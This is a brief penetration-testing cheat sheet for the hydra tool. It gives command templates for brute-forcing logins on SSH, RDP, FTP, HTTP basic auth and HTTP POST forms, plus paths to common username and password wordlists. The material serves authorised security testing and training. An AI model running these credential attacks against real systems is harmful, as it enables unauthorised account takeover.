---
tags:
  - tool
  - brute_forcing
---
# hydra

Brute force services

## Capabilities

```powershell
# Brute force protocols
hydra -l username -P /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt -s 2222 ssh://$IP -f
hydra -L /usr/share/seclists/Usernames/Names/names.txt -p '$PASSWD' rdp://$IP -f
hydra -L /usr/share/seclists/Usernames/Names/names.txt -p '$PASSWD' ftp://$IP -f

# Brute force basic auth (401)
hydra -l username -P /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt $IP http-get -f

# Brute force HTTP post request
hydra -l username -P /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt $IP http-post-form '/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid' -f
```

**Note:** `L` and `P` are used for username and password respectively, lowercase either of them to specify a single value

### Wordlists

```powershell
# Usernames
/home/kali/repos/statistically-likely-usernames/jsmith2.txt     # 4997
/usr/share/seclists/Usernames/Names/names.txt                   # 10177
/home/kali/repos/statistically-likely-usernames/jsmith.txt      # 48705
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt # 8295455

# Passwords
/usr/share/seclists/Passwords/2020-200_most_used_passwords.txt # 197
/usr/share/wordlists/rockyou.txt                               # 14344392
```
